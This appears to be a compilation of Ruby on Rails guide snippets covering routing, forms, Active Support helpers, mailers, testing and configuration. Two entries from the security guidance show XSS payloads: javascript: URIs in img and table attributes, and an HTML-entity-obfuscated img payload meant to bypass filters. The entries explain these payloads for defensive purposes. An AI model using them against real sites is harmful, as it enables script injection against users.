DESCRIPTION: Demonstrates how to use config.autoload_lib to add the lib directory to autoload paths while ignoring specific subdirectories that shouldn't be autoloaded.

LANGUAGE: ruby
CODE:
config.autoload_lib(ignore: %w(assets tasks))

----------------------------------------

TITLE: Displaying Available Rails Generators
DESCRIPTION: This command shows a list of all available generators in Rails. It helps developers identify what generators they can use to create different components of their application.

LANGUAGE: bash
CODE:
$ bin/rails generate
Usage:
  bin/rails generate GENERATOR [args] [options]

...
...

Please choose a generator below.

Rails:
  assets
  channel
  controller
  generator
  ...
  ...

----------------------------------------

TITLE: Creating the Application Database
DESCRIPTION: Command to initialize the application's database using Rails' built-in database creation task.

LANGUAGE: bash
CODE:
$ bin/rails db:create

----------------------------------------

TITLE: Enforcing Local Variables with Strict Locals in Rails Partials
DESCRIPTION: Demonstrates how strict locals prevents using undefined local variables, raising an exception when a partial is rendered with locals not specified in the signature.

LANGUAGE: ruby
CODE:
render "messages/message", unknown_local: "will raise"
# => ActionView::Template::Error: unknown local: :unknown_local for app/views/messages/_message.html.erb

----------------------------------------

TITLE: Creating a Form for a Model with Composite Primary Keys
DESCRIPTION: Shows how to use form_with to create a form for a Book model with a composite primary key. This form will be submitted to the correct URL for the composite key object.

LANGUAGE: erb
CODE:
<%= form_with model: @book do |form| %>
  <%= form.text_field :title %>
  <%= form.submit %>
<% end %>

----------------------------------------

TITLE: Querying with Bi-directional Associations in Rails IRB
DESCRIPTION: Demonstrates how Rails avoids additional queries when using properly configured bi-directional associations. This snippet shows how the author reference is the same object when accessed through books.

LANGUAGE: ruby
CODE:
irb> author = Author.first
irb> author.books.all? do |book|
irb>   book.author.equal?(author) # No additional queries executed here
irb> end
=> true

----------------------------------------

TITLE: Using Capybara for HTML Rendering Tests in Rails
DESCRIPTION: Example demonstrating how to override the default HTML parser with Capybara for enhanced view testing. This enables using Capybara's assertion methods on rendered content.

LANGUAGE: ruby
CODE:
register_parser :html, -> rendered { Capybara.string(rendered) }

test "renders HTML" do
  article = Article.create!(title: "Hello, world")

  render partial: article

  rendered_html.assert_css "main h1", text: "Hello, world"
end

----------------------------------------

TITLE: Mounting a Rails Engine within a Host Application
DESCRIPTION: Shows how to include a locally developed engine in a Rails application's Gemfile using a path reference.

LANGUAGE: ruby
CODE:
gem "blorgh", path: "engines/blorgh"

----------------------------------------

TITLE: Defining Non-Resourceful Routes with Optional Parameters in Rails
DESCRIPTION: Creates a custom route with an optional parameter denoted by parentheses. This route will match both /photos and /photos/1 patterns.

LANGUAGE: ruby
CODE:
get "photos(/:id)", to: "photos#display"

----------------------------------------

TITLE: Generating a Mailer Class with Rails Command Line
DESCRIPTION: This bash command generates a new mailer class called 'User', which creates the necessary files including the mailer class, views directory, and test files.

LANGUAGE: bash
CODE:
$ bin/rails generate mailer User
create  app/mailers/user_mailer.rb
invoke  erb
create    app/views/user_mailer
invoke  test_unit
create    test/mailers/user_mailer_test.rb
create    test/mailers/previews/user_mailer_preview.rb

----------------------------------------

TITLE: Accessing Single Characters in Strings in Ruby
DESCRIPTION: Demonstrates the at method for retrieving characters at specific positions in a string, with support for negative indices.

LANGUAGE: ruby
CODE:
"hello".at(0)  # => "h"
"hello".at(4)  # => "o"
"hello".at(-1) # => "o"
"hello".at(10) # => nil

----------------------------------------

TITLE: Using Named Route Helpers with Host Parameter in Mailers
DESCRIPTION: Example of using a named route helper with an explicitly passed host parameter in a mailer view. This ensures the generated URL is complete with the domain name.

LANGUAGE: erb
CODE:
<%= user_url(@user, host: 'example.com') %>

----------------------------------------

TITLE: Running Ruby Code with Rails Runner
DESCRIPTION: Shows how to execute Ruby code in the context of a Rails application using the runner command. This is useful for running scripts or one-off tasks without entering the console.

LANGUAGE: bash
CODE:
$ bin/rails runner "Model.long_running_method"

----------------------------------------

TITLE: Breaking Up Large Route Files with draw Macro
DESCRIPTION: Demonstrates how to use the draw macro to split a large routes.rb file into multiple smaller files. Shows the main routes file and a secondary file for admin routes.

LANGUAGE: ruby
CODE:
# config/routes.rb

Rails.application.routes.draw do
  get "foo", to: "foo#bar"

  draw(:admin) # Will load another route file located in `config/routes/admin.rb`
end

LANGUAGE: ruby
CODE:
# config/routes/admin.rb

namespace :admin do
  resources :comments
end

----------------------------------------

TITLE: Using Month Boundary Methods in Ruby on Rails
DESCRIPTION: Demonstrates the beginning_of_month and end_of_month methods to find the first and last dates of a month.

LANGUAGE: ruby
CODE:
d = Date.new(2010, 5, 9) # => Sun, 09 May 2010
d.beginning_of_month     # => Sat, 01 May 2010
d.end_of_month           # => Mon, 31 May 2010

----------------------------------------

TITLE: Using prev_quarter and next_quarter Methods with Time in Ruby
DESCRIPTION: Methods to get the time with the same day in the previous or next quarter. Handles edge cases when the day doesn't exist in the target month.

LANGUAGE: ruby
CODE:
t = Time.local(2010, 5, 8) # => 2010-05-08 00:00:00 +0300
t.prev_quarter             # => 2010-02-08 00:00:00 +0200
t.next_quarter             # => 2010-08-08 00:00:00 +0300

----------------------------------------

TITLE: Retrieving IDs from a Collection in Rails
DESCRIPTION: Uses the collection_singular_ids method to return an array of ids from associated objects in a has_many or has_and_belongs_to_many relationship.

LANGUAGE: ruby
CODE:
@assembly_ids = @part.assembly_ids

----------------------------------------

TITLE: Implementing Dynamic Attribute Methods with ActiveModel::AttributeMethods
DESCRIPTION: This example shows how to create a Person class with ActiveModel::AttributeMethods to define dynamic attribute-based methods with prefixes and suffixes. It demonstrates how to create custom attribute method patterns.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::AttributeMethods

  attribute_method_affix prefix: "reset_", suffix: "_to_default!"
  attribute_method_prefix "first_", "last_"
  attribute_method_suffix "_short?"

  define_attribute_methods "name"

  attr_accessor :name

  private
    # Attribute method call for 'first_name'
    def first_attribute(attribute)
      public_send(attribute).split.first
    end

    # Attribute method call for 'last_name'
    def last_attribute(attribute)
      public_send(attribute).split.last
    end

    # Attribute method call for 'name_short?'
    def attribute_short?(attribute)
      public_send(attribute).length < 5
    end

    # Attribute method call 'reset_name_to_default!'
    def reset_attribute_to_default!(attribute)
      public_send("#{attribute}=", "Default Name")
    end
end

----------------------------------------

TITLE: XSS Injection in Uncommon HTML Attributes
DESCRIPTION: Examples of XSS attacks that execute JavaScript from uncommon places like image sources and table backgrounds, demonstrating how attackers can bypass filters that only check standard script tags.

LANGUAGE: html
CODE:
<img src="javascript:alert('Hello')">
<table background="javascript:alert('Hello')">

----------------------------------------

TITLE: Basic Builder XML Template Examples
DESCRIPTION: Examples of using Builder templates to generate XML content with various tag structures and attributes.

LANGUAGE: ruby
CODE:
xml.em("emphasized")
xml.em { xml.b("emph & bold") }
xml.a("A Link", "href" => "https://rubyonrails.org")
xml.target("name" => "compile", "option" => "fast")

----------------------------------------

TITLE: Configuring Job Enqueuing Behavior within Transactions
DESCRIPTION: Example of a common anti-pattern where jobs might be enqueued within a transaction, which can cause issues if the job runs before the transaction commits. Rails 7.2 now automatically defers job enqueuing until after transaction commit.

LANGUAGE: ruby
CODE:
Topic.transaction do
  topic = Topic.create

  NewTopicNotificationJob.perform_later(topic)
end

----------------------------------------

TITLE: Adding Collection Routes with Block Syntax in Rails
DESCRIPTION: Defines custom collection routes within a resources block using the collection block. This adds routes that operate on the entire resource collection rather than individual instances.

LANGUAGE: ruby
CODE:
resources :photos do
  collection do
    get "search"
  end
end

----------------------------------------

TITLE: Passing Data to Partials Using locals
DESCRIPTION: Example showing how to pass data to partials using the locals option, including both the view and partial implementation.

LANGUAGE: html+erb
CODE:
<%# app/views/products/show.html.erb %>

<%= render partial: "product", locals: { my_product: @product } %>

<%# app/views/products/_product.html.erb %>

<%= tag.div id: dom_id(my_product) do %>
  <h1><%= my_product.name %></h1>
<% end %>

----------------------------------------

TITLE: Using Format Segments in Rails Routes
DESCRIPTION: Shows how wildcard segments handle format extensions in URLs. By default, Rails captures the format extension in params[:format] and the remaining path in the wildcard parameter.

LANGUAGE: ruby
CODE:
get "*pages", to: "pages#show"

----------------------------------------

TITLE: Creating a Web Notifications Subscription in JavaScript
DESCRIPTION: Implements a client-side web notifications channel subscription that displays browser notifications when data is received. This assumes the application has already requested permission to show notifications.

LANGUAGE: javascript
CODE:
// app/javascript/channels/web_notifications_channel.js
// Client-side which assumes you've already requested
// the right to send web notifications.
import consumer from "./consumer"

consumer.subscriptions.create("WebNotificationsChannel", {
  received(data) {
    new Notification(data["title"], { body: data["body"] })
  }
})

----------------------------------------

TITLE: Preparing Database for Solid Queue
DESCRIPTION: Command to prepare the database for use with Solid Queue, ensuring all required tables are created in the queue database.

LANGUAGE: bash
CODE:
$ bin/rails db:prepare

----------------------------------------

TITLE: Configuring Asset Pipeline in application.rb
DESCRIPTION: Configuration settings required in config/application.rb to enable the asset pipeline in Rails 3.1 applications. Includes options for enabling assets and setting custom asset prefixes.

LANGUAGE: ruby
CODE:
config.assets.enabled = true
config.assets.version = '1.0'

LANGUAGE: ruby
CODE:
# Defaults to '/assets'
config.assets.prefix = '/asset-files'

----------------------------------------

TITLE: Using alias_attribute in Rails ActiveModel in IRB
DESCRIPTION: This IRB session demonstrates how alias_attribute works in practice. It shows creating a Person object, setting the name attribute, and accessing both the original attribute and its alias. It also shows how dynamic methods work on both the original and aliased attributes.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.name = "Joe Doe"
irb> person.name
=> "Joe Doe"

# `full_name` is the alias for `name`, and returns the same value
irb> person.full_name
=> "Joe Doe"
irb> person.name_short?
=> false

# `full_name_short?` is the alias for `name_short?`, and returns the same value
irb> person.full_name_short?
=> false

----------------------------------------

TITLE: Using module_parent_name for Nested Module Introspection in Ruby
DESCRIPTION: Demonstrates how to use the module_parent_name method to get the fully qualified name of the module that contains a corresponding constant. Returns nil for top-level or anonymous modules.

LANGUAGE: ruby
CODE:
module X
  module Y
    module Z
    end
  end
end
M = X::Y::Z

X::Y::Z.module_parent_name # => "X::Y"
M.module_parent_name       # => "X::Y"

----------------------------------------

TITLE: Creating Simple Select Boxes in Rails Forms
DESCRIPTION: Shows how to use the select helper to create a dropdown list with city options. The cities are displayed and submitted as the same values.

LANGUAGE: erb
CODE:
<%= form.select :city, ["Berlin", "Chicago", "Madrid"] %>

----------------------------------------

TITLE: Getting i18n Key for Model in Rails
DESCRIPTION: Shows the model_name.i18n_key method which returns the name as a symbol for internationalization. Used for looking up translations.

LANGUAGE: irb
CODE:
irb> Person.model_name.i18n_key
=> :person

----------------------------------------

TITLE: Allowing Only Modern Browsers in Rails 7.2+ Controllers
DESCRIPTION: This Ruby snippet shows how to use the allow_browser method to restrict application access to modern browsers only. This feature, introduced in Rails 7.2, allows developers to target browsers that support specific modern web features.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  # Only allow modern browsers supporting webp images, web push, badges, import maps, CSS nesting, and CSS :has.
  allow_browser versions: :modern
end

----------------------------------------

TITLE: Migration Output Example
DESCRIPTION: This shows the default output format of a Rails migration that creates a table and adds an index, displaying execution time information.

LANGUAGE: text
CODE:
==  CreateProducts: migrating =================================================
-- create_table(:products)
   -> 0.0028s
==  CreateProducts: migrated (0.0028s) ========================================

----------------------------------------

TITLE: Implementing Custom Constraints with a Class in Rails Routes
DESCRIPTION: Creates a RestrictedListConstraint class that evaluates if a request's IP address is on a restricted list. This constraint is then applied to a route to redirect matching requests to a specific controller action.

LANGUAGE: ruby
CODE:
class RestrictedListConstraint
  def initialize
    @ips = RestrictedList.retrieve_ips
  end

  def matches?(request)
    @ips.include?(request.remote_ip)
  end
end

Rails.application.routes.draw do
  get "*path", to: "restricted_list#index",
    constraints: RestrictedListConstraint.new
end

----------------------------------------

TITLE: Model Object Initialization for Form Binding in Rails
DESCRIPTION: Shows initialization of a Book model instance that would be used with the :model option in form_with. This enables form fields to be automatically bound to model attributes.

LANGUAGE: ruby
CODE:
@book = Book.new

----------------------------------------

TITLE: Configuring Mandrill Ingress in Rails
DESCRIPTION: Rails configuration to accept emails from Mandrill. This enables the Mandrill ingress in the application's production environment.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
config.action_mailbox.ingress = :mandrill

----------------------------------------

TITLE: Configuring Primary Abstract Class for Database Connections
DESCRIPTION: Ruby code demonstrating how to set up a custom-named primary abstract class that connects to primary and replica databases.

LANGUAGE: ruby
CODE:
class PrimaryApplicationRecord < ActiveRecord::Base
  primary_abstract_class

  connects_to database: { writing: :primary, reading: :primary_replica }
end

----------------------------------------

TITLE: Using assert_queries_match for Testing SQL Query Patterns in Rails
DESCRIPTION: Tests that a block generates SQL queries matching a specific pattern, with optional count verification.

LANGUAGE: ruby
CODE:
assert_queries_match(pattern, count: nil, include_schema: false, &block)

----------------------------------------

TITLE: Cache Increment Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_increment.active_support event. This shows the cache key, store class name, and increment amount.

LANGUAGE: ruby
CODE:
{
  key: "bottles-of-beer",
  store: "ActiveSupport::Cache::RedisCacheStore",
  amount: 99
}

----------------------------------------

TITLE: YAML Fixture Example for Rails Testing
DESCRIPTION: A sample YAML fixture file showing how to define test data for models. This example defines two user records with various attributes in a human-readable format.

LANGUAGE: yaml
CODE:
# lo & behold! I am a YAML comment!
david:
  name: David Heinemeier Hansson
  birthday: 1979-10-15
  profession: Systems development

steve:
  name: Steve Ross Kellock
  birthday: 1974-09-27
  profession: guy with keyboard

----------------------------------------

TITLE: Moving Middlewares Before Other Middlewares in Rails Configuration
DESCRIPTION: Shows how to change the order of middlewares by moving one middleware before another using the config.middleware.move_before method. This is useful for changing execution order.

LANGUAGE: ruby
CODE:
# config/application.rb

# Move ActionDispatch::ShowExceptions to before Lifo::ShowExceptions
config.middleware.move_before Lifo::ShowExceptions, ActionDispatch::ShowExceptions

----------------------------------------

TITLE: Setting Content Type in Rails Render
DESCRIPTION: Example of using the :content_type option with render to specify a custom MIME type for the response. This example sets the content type to RSS format.

LANGUAGE: ruby
CODE:
render template: "feed", content_type: "application/rss"

----------------------------------------

TITLE: Word Truncation with Separator in Ruby
DESCRIPTION: Demonstrates specifying a separator for word truncation to find natural break points in text.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate_words(3, separator: "!")
# => "Oh dear! Oh dear! I shall be late..."

----------------------------------------

TITLE: Generating User Scaffold in Rails
DESCRIPTION: Command to generate a scaffold for a User model with name, email and login attributes, followed by running database migrations.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold user name email login
$ bin/rails db:migrate

----------------------------------------

TITLE: Generating a Resource for API-only Rails Application
DESCRIPTION: Command to scaffold a new Group resource with a name attribute in an API-only Rails application. This creates the model, controller, and routes without views.

LANGUAGE: bash
CODE:
$ bin/rails g scaffold Group name:string

----------------------------------------

TITLE: Custom Attachment Partial for User
DESCRIPTION: Custom partial template for rendering a User model as an Action Text attachment.

LANGUAGE: html
CODE:
<%# app/views/users/_attachable.html.erb %>
<span><%= image_tag user.avatar %> <%= user.name %></span>

----------------------------------------

TITLE: Updating Strong Parameters to Include Inventory Count
DESCRIPTION: Shows how to update the product_params method in the ProductsController to permit the inventory_count parameter for inventory tracking.

LANGUAGE: ruby
CODE:
    def product_params
      params.expect(product: [ :name, :description, :featured_image, :inventory_count ])
    end

----------------------------------------

TITLE: Year-Based Date Calculations in Ruby on Rails
DESCRIPTION: Shows how to shift dates forward or backward by a specified number of years using years_ago and years_since methods, including handling leap year edge cases.

LANGUAGE: ruby
CODE:
date = Date.new(2010, 6, 7)
date.years_ago(10) # => Wed, 07 Jun 2000

LANGUAGE: ruby
CODE:
date = Date.new(2010, 6, 7)
date.years_since(10) # => Sun, 07 Jun 2020

LANGUAGE: ruby
CODE:
Date.new(2012, 2, 29).years_ago(3)     # => Sat, 28 Feb 2009
Date.new(2012, 2, 29).years_since(3)   # => Sat, 28 Feb 2015

----------------------------------------

TITLE: Formatting Numbers as Currency in Ruby on Rails
DESCRIPTION: The to_fs(:currency) method formats numbers as currency values with options like precision for controlling decimal places.

LANGUAGE: ruby
CODE:
1234567890.50.to_fs(:currency)                 # => $1,234,567,890.50
1234567890.506.to_fs(:currency)                # => $1,234,567,890.51
1234567890.506.to_fs(:currency, precision: 3)  # => $1,234,567,890.506

----------------------------------------

TITLE: Checking Zeitwerk Compatibility in Rails Application
DESCRIPTION: Command to check if the application's structure is compatible with Zeitwerk autoloading mode, which is important when upgrading to Rails 6.

LANGUAGE: bash
CODE:
$ bin/rails zeitwerk:check
Hold on, I am eager loading the application.
All is good!

----------------------------------------

TITLE: Getting Route Key for Model in Rails
DESCRIPTION: Demonstrates the model_name.route_key method which returns a string to use when generating route names. Typically returns the pluralized, underscored version of the class name.

LANGUAGE: irb
CODE:
irb> Person.model_name.route_key
=> "people"

----------------------------------------

TITLE: Obfuscated JavaScript Using HTML Entity Encoding
DESCRIPTION: An example of obfuscated XSS payload using HTML entity encoding to bypass filters. This technique converts JavaScript code to decimal HTML entities that browsers will automatically decode and execute.

LANGUAGE: html
CODE:
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

----------------------------------------

TITLE: Fetching Headers with cURL from CDN
DESCRIPTION: Shows how to use cURL to request headers from your CDN to verify that caching is working properly and to examine CDN-specific headers like X-Cache.

LANGUAGE: bash
CODE:
$ curl -I http://mycdnsubdomain.fictional-cdn.com/application-d0e099e021c95eb0de3615fd1d8c4d83.css
HTTP/1.1 200 OK Server: Cowboy Last-
Modified: Thu, 08 May 2014 01:24:14 GMT Content-Type: text/css
Cache-Control:
public, max-age=2592000
Via: 1.1 vegur
Content-Length: 126560
Accept-Ranges:
bytes
Date: Sun, 24 Aug 2014 20:28:45 GMT
Via: 1.1 varnish
Age: 885814
Connection: keep-alive
X-Served-By: cache-dfw1828-DFW
X-Cache: HIT
X-Cache-Hits:
68
X-Timer: S1408912125.211638212,VS0,VE0

----------------------------------------

TITLE: Disabling Format Segments in Rails Routes
DESCRIPTION: Demonstrates how to disable format segment capturing in routes by setting format: false. This makes Rails ignore URL formats and treat the entire path as the wildcard parameter.

LANGUAGE: ruby
CODE:
get "*pages", to: "pages#show", format: false

----------------------------------------

TITLE: Generating Dynamic Fixtures with ERB in Rails
DESCRIPTION: Example of using ERB to dynamically generate fixture data. This snippet creates a thousand user records with unique usernames and email addresses.

LANGUAGE: erb
CODE:
<% 1000.times do |n| %>
  user_<%= n %>:
    username: <%= "user#{n}" %>
    email: <%= "user#{n}@example.com" %>
<% end %>

----------------------------------------

TITLE: Creating a Core Extension Test File
DESCRIPTION: Test file that verifies the functionality of a String extension method called 'to_squawk'. This demonstrates how to test core class extensions in a Rails plugin using the test framework.

LANGUAGE: ruby
CODE:
# yaffle/test/core_ext_test.rb

require "test_helper"

class CoreExtTest < ActiveSupport::TestCase
  def test_to_squawk_prepends_the_word_squawk
    assert_equal "squawk! Hello World", "Hello World".to_squawk
  end
end

----------------------------------------

TITLE: HTML Output of Form for a Model with Composite Primary Key
DESCRIPTION: Shows the HTML that Rails generates for a form targeting a model with a composite primary key.

LANGUAGE: html
CODE:
<form action="/books/2_25" method="post" accept-charset="UTF-8" >
  <input name="authenticity_token" type="hidden" value="..." />
  <input type="text" name="book[title]" id="book_title" value="My book" />
  <input type="submit" name="commit" value="Update Book" data-disable-with="Update Book">
</form>

----------------------------------------

TITLE: Configuring ActiveStorage Analyzers in Rails
DESCRIPTION: Defines the analyzers available for ActiveStorage blobs. This configuration includes image, video, and audio analyzers that can extract metadata from different types of files.

LANGUAGE: ruby
CODE:
config.active_storage.analyzers = [ActiveStorage::Analyzer::ImageAnalyzer::Vips, ActiveStorage::Analyzer::ImageAnalyzer::ImageMagick, ActiveStorage::Analyzer::VideoAnalyzer, ActiveStorage::Analyzer::AudioAnalyzer]

----------------------------------------

TITLE: Adding HTML Attributes to Inline Images in Email Templates
DESCRIPTION: HTML+ERB template code showing how to add HTML attributes like alt text and CSS classes to inline images in an email template.

LANGUAGE: html+erb
CODE:
<p>Hello there, this is our image</p>

<%= image_tag attachments['image.jpg'].url, alt: 'My Photo', class: 'photos' %>

----------------------------------------

TITLE: Adding Routes with route Method
DESCRIPTION: Example of adding a routing entry to the config/routes.rb file using the route method to set up the root path.

LANGUAGE: ruby
CODE:
route "root to: 'person#index'"

----------------------------------------

TITLE: Enabling Verbose Enqueue Logs in Rails Application
DESCRIPTION: Demonstrates how to enable verbose enqueue logs which print source locations of methods that enqueue background jobs, useful for debugging job-related issues.

LANGUAGE: ruby
CODE:
config.active_job.verbose_enqueue_logs = true

----------------------------------------

TITLE: Testing Enqueued Emails with Positional Arguments in Rails
DESCRIPTION: Demonstrates testing that an email is correctly enqueued with deliver_later using the assert_enqueued_email_with assertion. This tests the correct mailer class, method, and arguments.

LANGUAGE: ruby
CODE:
require "test_helper"

class UserMailerTest < ActionMailer::TestCase
  test "invite" do
    # Create the email and store it for further assertions
    email = UserMailer.create_invite("me@example.com", "friend@example.com")

    # Test that the email got enqueued with the correct arguments
    assert_enqueued_email_with UserMailer, :create_invite, args: ["me@example.com", "friend@example.com"] do
      email.deliver_later
    end
  end
end

----------------------------------------

TITLE: Getting Singular Route Key for Model in Rails
DESCRIPTION: Shows the model_name.singular_route_key method which returns a string for generating singular route names. Returns the singular, underscored version of the class name.

LANGUAGE: irb
CODE:
irb> Person.model_name.singular_route_key
=> "person"

----------------------------------------

TITLE: Using Enumerable#index_by in Ruby on Rails
DESCRIPTION: This method generates a hash with elements of an enumerable indexed by a key. It iterates through the collection and uses the block's return value as the key for each element.

LANGUAGE: ruby
CODE:
invoices.index_by(&:number)
# => {"2009-032" => <Invoice ...>, "2009-008" => <Invoice ...>, ...}

----------------------------------------

TITLE: Configuring SQLite3 Database for JRuby in Rails
DESCRIPTION: This configuration shows the setup for an SQLite3 database when using JRuby. It uses the jdbcsqlite3 adapter instead of the standard sqlite3 adapter.

LANGUAGE: yaml
CODE:
development:
  adapter: jdbcsqlite3
  database: storage/development.sqlite3

----------------------------------------

TITLE: Command Invocation Logic in Rails::Command Module
DESCRIPTION: Responsible for finding and executing the requested Rails command or falling back to Rake if the command is not recognized.

LANGUAGE: ruby
CODE:
module Rails
  module Command
    class << self
      def invoke(full_namespace, args = [], **config)
        args = ["--help"] if rails_new_with_no_path?(args)

        full_namespace = full_namespace.to_s
        namespace, command_name = split_namespace(full_namespace)
        command = find_by_namespace(namespace, command_name)

        with_argv(args) do
          if command && command.all_commands[command_name]
            command.perform(command_name, args, config)
          else
            invoke_rake(full_namespace, args, config)
          end
        end
      rescue UnrecognizedCommandError => error
        if error.name == full_namespace && command && command_name == full_namespace
          command.perform("help", [], config)
        else
          puts error.detailed_message
        end
        exit(1)
      end
    end
  end
end

----------------------------------------

TITLE: Implementing Custom Configuration Namespace in Rails
DESCRIPTION: Example of using the config.x namespace for creating nested custom configuration in a Rails application. This allows for organized, namespaced configuration values that are accessible throughout the application.

LANGUAGE: ruby
CODE:
config.x.payment_processing.schedule = :daily
Rails.configuration.x.payment_processing.schedule # => :daily

----------------------------------------

TITLE: Specialized Form Input Fields in Rails
DESCRIPTION: Shows specialized input fields with specific formatting for password, email, telephone, and URL inputs. These field types provide appropriate validation and input format on compatible browsers.

LANGUAGE: erb
CODE:
<%= form.password_field :password %>
<%= form.email_field :address %>
<%= form.telephone_field :phone %>
<%= form.url_field :homepage %>

LANGUAGE: html
CODE:
<input type="password" name="password" id="password">
<input type="email" name="address" id="address">
<input type="tel" name="phone" id="phone">
<input type="url" name="homepage" id="homepage">

----------------------------------------

TITLE: Using assert_dom_email for Testing Email Content in Rails
DESCRIPTION: Demonstrates how to use the assert_dom_email assertion to make DOM assertions on the body of an email. This allows testing the HTML structure within email templates.

LANGUAGE: ruby
CODE:
assert_dom_email do
  assert_dom "small", "Please click the 'Unsubscribe' link if you want to opt-out."
end

----------------------------------------

TITLE: Defining City and Person Models with Association in Ruby
DESCRIPTION: This snippet defines City and Person models with a belongs_to association. This setup is used to demonstrate collection helpers for generating form inputs from collections of objects.

LANGUAGE: ruby
CODE:
class City < ApplicationRecord
end

class Person < ApplicationRecord
  belongs_to :city
end

----------------------------------------

TITLE: Setting Up Custom Fixture Class Names in Rails Tests
DESCRIPTION: Shows how to configure fixtures when using a custom table name. The set_fixture_class method maps the fixture file name to the corresponding model class when the default convention isn't followed.

LANGUAGE: ruby
CODE:
# test/models/book_test.rb
class BookTest < ActiveSupport::TestCase
  set_fixture_class my_books: Book
  fixtures :my_books
  # ...
end

----------------------------------------

TITLE: Overriding Parent Layout in Rails Controller
DESCRIPTION: Example of a controller that overrides the layout from its parent controller by specifying a different layout.

LANGUAGE: ruby
CODE:
class SpecialArticlesController < ArticlesController
  layout "special"
end

----------------------------------------

TITLE: Read-Only Connection Switching with Write Prevention
DESCRIPTION: Using connected_to with prevent_writes flag to ensure queries within the block are read-only, providing an additional safety check.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.connected_to(role: :reading, prevent_writes: true) do
  # Rails will check each query to ensure it's a read query.
end

----------------------------------------

TITLE: Using auto_discovery_link_tag Helper in Rails
DESCRIPTION: Example of using the auto_discovery_link_tag helper to generate links for RSS, Atom, or JSON feeds that browsers and feed readers can detect automatically.

LANGUAGE: erb
CODE:
<%= auto_discovery_link_tag(:rss, {action: "feed"},
  {title: "RSS Feed"}) %>

----------------------------------------

TITLE: Configuring Server Options in Rails Command Module
DESCRIPTION: Defines the server options used to initialize the Rails server, including port, host, environment settings and other configuration parameters.

LANGUAGE: ruby
CODE:
module Rails
  module Command
    class ServerCommand < Base # :nodoc:
      no_commands do
        def server_options
          {
            user_supplied_options: user_supplied_options,
            server:                options[:using],
            log_stdout:            log_to_stdout?,
            Port:                  port,
            Host:                  host,
            DoNotReverseLookup:    true,
            config:                options[:config],
            environment:           environment,
            daemonize:             options[:daemon],
            pid:                   pid,
            caching:               options[:dev_caching],
            restart_cmd:           restart_command,
            early_hints:           early_hints
          }
        end
      end
    end
  end
end

----------------------------------------

TITLE: Updating Match Routes for Rails 4.0
DESCRIPTION: Rails 4.0 requires that routes using match must specify the request method via the 'via' option. This example shows how to update match routes to comply with the new requirements.

LANGUAGE: ruby
CODE:
# Rails 3.x
match "/" => "root#index"

# becomes
match "/" => "root#index", via: :get

# or
get "/" => "root#index"

----------------------------------------

TITLE: Mail Delivery Example Payload in Action Mailer
DESCRIPTION: Example of the payload data available during a deliver.action_mailer event. This includes mailer class, message ID, subject, recipient and sender information, and delivery settings.

LANGUAGE: ruby
CODE:
{
  mailer: "Notification",
  message_id: "4f5b5491f1774_181b23fc3d4434d38138e5@mba.local.mail",
  subject: "Rails Guides",
  to: ["users@rails.com", "dhh@rails.com"],
  from: ["me@rails.com"],
  date: Sat, 10 Mar 2012 14:18:09 +0100,
  mail: "...", # omitted for brevity
  perform_deliveries: true
}

----------------------------------------

TITLE: Inserting Middleware After Another in Rails
DESCRIPTION: Demonstrates how to insert middleware after a specific middleware in the Rails stack. This complements the insert_before method for positioning middleware.

LANGUAGE: ruby
CODE:
config.middleware.insert_after Rack::Head, Magical::Unicorns

----------------------------------------

TITLE: Specifying Custom Host for Specific Assets in ERB
DESCRIPTION: Shows how to override the default CDN host for specific assets by passing a custom host option to the asset_path helper, allowing selective CDN usage.

LANGUAGE: erb
CODE:
<%= asset_path 'image.png', host: 'mycdnsubdomain.fictional-cdn.com' %>

----------------------------------------

TITLE: Using Duration objects with dates in Ruby on Rails
DESCRIPTION: Duration objects can be added to and subtracted from dates, which translates to calls to since or advance methods. This example shows handling of the calendar reform.

LANGUAGE: ruby
CODE:
d = Date.current
# => Mon, 09 Aug 2010
d + 1.year
# => Tue, 09 Aug 2011
d - 3.hours
# => Sun, 08 Aug 2010 21:00:00 UTC +00:00

LANGUAGE: ruby
CODE:
Date.new(1582, 10, 4) + 1.day
# => Fri, 15 Oct 1582

----------------------------------------

TITLE: Demonstrating Time Arithmetic with ActiveSupport
DESCRIPTION: Shows how ActiveSupport extends Time objects with methods to add or subtract time periods. It demonstrates adding years, subtracting weeks, and illustrates the correct handling of calendar reforms.

LANGUAGE: ruby
CODE:
now + 1.year
# => Tue, 09 Aug 2011 23:21:11 UTC +00:00
now - 1.week
# => Mon, 02 Aug 2010 23:21:11 UTC +00:00

LANGUAGE: ruby
CODE:
Time.utc(1582, 10, 3) + 5.days
# => Mon Oct 18 00:00:00 UTC 1582

----------------------------------------

TITLE: Using attributes Method with ActiveModel::Attributes
DESCRIPTION: This snippet demonstrates the attributes method available with ActiveModel::Attributes, which returns a hash of all attribute names and their current values.

LANGUAGE: ruby
CODE:
irb> person.attributes
=> {"name" => "Jane", "date_of_birth" => Wed, 01 Jan 2020, "active" => false}

----------------------------------------

TITLE: Using serializable_hash with Options in Rails
DESCRIPTION: Shows how to use the serializable_hash method with various options like :only, :except, and :methods to customize the serialized output.

LANGUAGE: irb
CODE:
irb> person = Person.new

irb> person.serializable_hash
=> {"name" => nil, "age" => nil}

# Set the name and age attributes and serialize the object
irb> person.name = "bob"
irb> person.age = 22
irb> person.serializable_hash
=> {"name" => "bob", "age" => 22}

# Use the methods option to include the capitalized_name method
irb>  person.serializable_hash(methods: :capitalized_name)
=> {"name" => "bob", "age" => 22, "capitalized_name" => "Bob"}

# Use the only method to include only the name attribute
irb> person.serializable_hash(only: :name)
=> {"name" => "bob"}

# Use the except method to exclude the name attribute
irb> person.serializable_hash(except: :name)
=> {"age" => 22}

----------------------------------------

TITLE: Using Session ID for CSP Nonce Generation
DESCRIPTION: This alternative approach to nonce generation uses the session ID instead of random values, making it compatible with ETag caching while still providing CSP protection, though with security dependent on session ID randomness.

LANGUAGE: ruby
CODE:
Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }

----------------------------------------

